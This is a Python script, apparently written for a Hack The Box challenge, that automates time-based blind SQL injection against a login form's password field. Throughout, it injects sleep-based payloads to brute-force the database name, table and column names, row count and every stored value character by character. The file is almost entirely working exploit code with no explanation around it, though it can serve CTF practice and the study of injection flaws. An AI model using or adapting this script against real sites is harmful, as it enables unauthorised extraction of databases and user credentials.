#!/usr/bin/python3

# Note that there might be false positive because of real timeout (no by our sleep).
# Increasing the timeout and sleep might mitigate the issue.

import requests
import sys
import string

default_timeout = 2

def clear_line():
    sys.stdout.write("\033[F")  #back to previous line
    sys.stdout.write("\033[K")  #clear line

def ask_post(url, data):  # return True if successfuly sleeped
    rst = False
    try:
        r = requests.post(url, data=data, timeout=default_timeout)
        if not r.ok:
            raise Exception('[!] Response is not ok')
    except requests.exceptions.Timeout:
        rst = True
    return rst


# checks the vulnerability. Exits the program if not vuln.
def check_vuln(url, data, field):
    data[field] = "admin' or sleep(4)-- +"
    if ask_post(url, data):
        print('[+] Target appears to be vulnerable')
    else:
        print('[!] Not vulnerable')
        sys.exit(-1)

# get the length of the database name.
def get_len_db_name(url, data, field):
    # the 'dual' table name is useless here.
    print('[+] Checking database name length')
    len_db_name = 1
    payload = "admin' or (select sleep(4) from dual \
                where (select length(database())={}))-- +"
    while True:
        data[field] = payload.format(len_db_name)
        if ask_post(url, data):
            break
        len_db_name += 1
    print('[+] Database name has {} chars'.format(len_db_name))
    return len_db_name

# brute force the database name
def get_db_name(url, data, field, len_db_name):
    print('[+] brute-force database name')
    db_name = ''
    for i in range(1, len_db_name + 1):
        for c in string.ascii_letters:
            data[field] = "admin' or \
                    (select sleep(4) from dual where \
                    (select ascii(substr(database(),{},1))={})\
                    )-- +".format(i, ord(c))
            if ask_post(url, data):
                db_name += c
                break
    print('[+] Database name is {}'.format(db_name))
    return db_name

# brute force the length of table name
def get_len_tb_name(url, data, field):
    len_tb_name = 1
    print('[+] Checking table name length')
    payload = "admin' or \
            (select sleep(4) from dual where \
                (select length(\
                    (select table_name from information_schema.tables where table_schema=database() limit 0, 1)\
                    ) = {}\
                )\
            )-- +"
    while True:
        data[field] = payload.format(len_tb_name)
        if ask_post(url, data):
            break
        len_tb_name += 1
    print('[+] Table name has {} chars'.format(len_tb_name))
    return len_tb_name

# brute force the table name
def get_tb_name(url, data, field, len_tb_name):
    print('[+] brute-force table name')
    payload = "admin' or \
            (select sleep(4) from dual where \
                (select \
                    ascii(\
                        substr(\
                            (select table_name from information_schema.tables where table_schema=database() limit 0, 1)\
                            , {}, 1\
                        )\
                    ) = {}\
                )\
            )-- +"
    print('[+] Table name is')
    tb_name = ''
    for i in range(1, len_tb_name + 1):
        for c in string.ascii_letters:
            data[field] = payload.format(i, ord(c))
            if ask_post(url, data):
                clear_line()
                tb_name += c
                print('[+] Table name is {}'.format(tb_name))
                break
    return tb_name

# gets number of columns
def get_num_col(url, data, field, tb_name):
    payload = "admin' or \
            (select sleep(4) from dual where \
                (select \
                    (select COUNT(column_name) from information_schema.columns where table_name='{}'" + \
                    ")\
                    = {}\
                )\
            )-- +"
    num_cols = 1
    while True:
        data[field] =  payload.format(tb_name, num_cols)
        if ask_post(url, data):
            break
        num_cols += 1
    print('[+] There are {} columns in table {}'.format(num_cols, tb_name))
    return num_cols

# gets length of the Nth column name.
# N starts from 0;
def get_len_col_name(url, data, field, tb_name, n):
    len_col_name = 1
    print('[+] Checking column name length')
    payload = "admin' or \
            (select sleep(4) from dual where \
                (select length(\
                    (select column_name from information_schema.columns where table_name='{}' limit {}, 1)\
                    ) = {}\
                )\
            )-- +"
    while True:
        data[field] = payload.format(tb_name, n, len_col_name)
        if ask_post(url, data):
            break
        len_col_name += 1
    print('[+] Column name has {} chars'.format(len_col_name))
    return len_col_name

# brutes force the Nth column name.
# N starts from 0;
def get_col_name(url, data, field, tb_name, n, len_col_name):
    print('[+] brute-force column name')
    payload = "admin' or \
            (select sleep(4) from dual where \
                (select \
                    ascii(\
                        substr(\
                            (select column_name from information_schema.columns where table_name='{}' limit {}, 1)\
                            , {}, 1\
                        )\
                    ) = {}\
                )\
            )-- +"
    print('[+] Column name is')
    col_name = ''
    for i in range(1, len_col_name + 1):
        for c in string.ascii_letters:
            data[field] = payload.format(tb_name, n, i, ord(c))
            if ask_post(url, data):
                clear_line()
                col_name += c
                print('[+] Column name is {}'.format(col_name))
                break
    return col_name

# Counts how many rows are there in the table.
def count_rows(url, data, field, tb_name):
    print('[+] Count number of rows in the table ' + tb_name)
    payload = "admin' or \
            (select sleep(4) from dual where (select count(*) from {}) = {})-- +"
    num_rows = 1
    while True:
        data[field] = payload.format(tb_name, num_rows)
        if ask_post(url, data):
            break
        num_rows += 1
    print('[+] There are {} rows in {}'.format(num_rows, tb_name))
    return num_rows

# brutes force the column value of Nth row.
def get_col_val(url, data, field, tb_name, n, col_name):
    print('[+] Checking length, column {}, row {}, table {}'.format(col_name, n, tb_name))
    payload = "admin' or \
            (select sleep(4) from dual where \
                (select length(\
                            (select {} from {} limit {}, 1)\
                        ) = {}\
                )\
            )-- +"
    # Note that the value could be null!
    len_col_val = 0
    while True:
        data[field] = payload.format(col_name, tb_name, n, len_col_val)
        if ask_post(url, data):
            break
        len_col_val += 1
    print('[+] It has {} chars'.format(len_col_val))

    print('[+] Brute-force value length, column {}, row {}'.format(col_name, n))
    payload = "admin' or \
            (select sleep(4) from dual where \
                (select \
                    ascii(substr((select {} from {} limit {}, 1) , {}, 1)) = {}\
                )\
            )-- +"
    print('[+] Value is ')
    value = ''
    for i in range(1, len_col_val + 1):
        for c in string.ascii_letters:
            data[field] = payload.format(col_name, tb_name, n, i, ord(c))
            if ask_post(url, data):
                clear_line()
                value += c
                print('[+] Value is {}'.format(value))
                break
    return value

def main():
    url = 'http://docker.hackthebox.eu:32414'
    data = {'username':'admin', 'password':"admin"}
    field = 'password'

    check_vuln(url, data, field)

    len_db_name = get_len_db_name(url, data, field)
    db_name = get_db_name(url, data, field, len_db_name)
    len_tb_name = get_len_tb_name(url, data, field)
    tb_name = get_tb_name(url, data, field, len_tb_name)
    num_col = get_num_col(url, data, field, tb_name)
    col_names = []
    for i in range(num_col):
        len_col_name = get_len_col_name(url, data, field, tb_name, i)
        col_names.append(get_col_name(url, data, field, tb_name, i, len_col_name))
    print("[+] Columns are: ", col_names)
 
    num_rows = count_rows(url, data, field, tb_name)
    for i in range(num_rows):
        values = []
        for col_name in col_names:
            values.append(get_col_val(url, data, field, tb_name, i, col_name))
        print("Values are: ", values)

if __name__ == '__main__':
    main()
